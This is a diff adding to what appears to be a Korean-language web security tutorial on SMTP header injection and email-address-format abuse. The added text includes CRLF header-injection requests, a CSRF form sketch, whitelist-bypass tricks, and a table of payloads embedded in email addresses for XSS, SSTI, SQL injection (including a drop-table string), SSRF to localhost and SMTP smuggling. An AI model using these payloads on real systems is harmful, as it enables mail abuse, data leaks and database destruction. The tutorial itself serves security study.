@@ -76,3 +76,86 @@ POST /emailtest HTTP/1.1<br><br>
 
 subject=Hello+Test%0d%0aCc: Attacker@email.com
 </div>
+💡 **<u style="color:red;">CSRF 와 같은 취약점과 연계할 경우 2FA 인증 우회 및 민감정보등이 유출될 수 있다.</u>**
+
+```html
+<form arciton="https://weakness-service/authentication" method="post">
+    <input type=text name="email" value="target@domain.com%0ACc:attacker@domain.com">
+</form>
+```
+
+## Subject OR Massage
+
+<div class="notice">
+POST /emailtest HTTP/1.1<br><br>
+
+'''<br><br>
+
+subject=Hello+Test%0d%0aSubject: Fake Subject<br><br>
+
+POST /emailtest HTTP/1.1<br><br>
+
+'''<br><br>
+
+subject=Hello+Test%0d%0a%0d%0akikiki%20hacking!!
+</div>
+
+## PHP mail() Function
+> mail 시스템 처리를 위해 command line을 통해 타 mail application을 사용할 경우 특수문자에 대한 필터링일 적절하게 이루어지지 않을경우, command injection으로 이어질 위험성이 존재한다.
+
+# Email address format 을 통한 취약점 연계 기술들
+Email address format에는 <span style="background-color: #FFB6C1;">local-part@domain</span> 부분으로 나뉜다.<br>
+정확히는 아래와 같이 구분할 수 있다.
+
+> attacker@email.com
+
+1. username : attacker
+2. @ symbol : @
+3. dot(.) : .
+4. Domain Name : email.com
+
+## Local-part 부분에서 사용가능한 문자
+
+<div class="notice">
+1. 대소문자 및 소문자<br>
+2. 숫자 0~9<br>
+3. 몇몇의 특수 문자들 : !#$%&'*+-/=?^_`{|}~<br>
+4. dot(.) : 첫 번째 또는 마지막문자가 아니며, 연속적으로 나타나지 않는 경우
+</div>
+()(괄호)는 Local-part 에서 주석을 의미할 수 있다.<br>
+tartget+attacker@email.com === target@email.com 과 동일하다.<br><br>
+드물게 특수문자들은 제한적으로 사용이 가능하다."(),:;<>@[\]<br>
+도한 주석을 의미할 수 있다. 물론<br>
+tartget(attacker)@email.com === target@email.com 과 동일하다.<br>
+이를 통해 WhiteList 정책 필터링을 우회할 수 있다.
+
+![그림 1-1](/assets/image/vuln/web-vuln/SMTPI/image.png)
+![그림 1-2](/assets/image/vuln/web-vuln/SMTPI/image-1.png)
+[ ] 를 사용하여 IP를 대입할 수도 있다.
+<div class="notice">
+trust@[127.0.0.1]
+</div>
+
+## “ 를 사용하게 된다면??
+Local-Part 부분에서 “ 가 사용가능하다면 SMTP Injection 의 파급력은 엄청나진다.
+공백 및 특수문자등 일반적인 Local-Part 부분에서 사용할 수 없는 문자들이 사용 가능해진다.
+즉, 특수문자를 사용해야하는 Web-attack 공격기법들이 전부 사용 가능할 수 있다.
+
+| <span style="color:red">Vlunability</span> | <span style="color:red">Payload</span> |
+|-----------------------------|--------------------------------------------------|
+| XSS                         | test+(<script>alert(1)</script>)@example.com   |
+|                             | test@example(<script>alert(1)</script>.com     |
+|                             | ”<script>alert(1)</script>”@example.com        |
+| Templiate Injection (SSTI)  | “<%=7*7%>”@example.com                         |
+|                             | test+(${{7*7}})@example.com                    |
+| SQL Injection               | “’ or 1=1 —’”@example.com                      |
+|                             | ”mail’); drop table users;—”@exapmle.com       |
+| SSRF                        | trust@abc123.interserver                       |
+|                             | trust@[127.0.0.1]                              |
+| Parameter Pollution         | victim&email=attacker@example.com              |
+| (Email) SMTP Header Injection | “%0d%0aContent-Length;%200%0d%0a%0d%0a”@example.com |
+|                             | ”recipient@test.com>\r\nRCPT TO;<victim+”@test.com |
+| Wildcard abuse              | %@example.com`                                 |
+
+
+💡 **<u style="color:red;">이러한 공격들은 특정 사용자들의 이메일 정보를 관리자에게 보낼 때 시도해볼 수 있다.</u>**
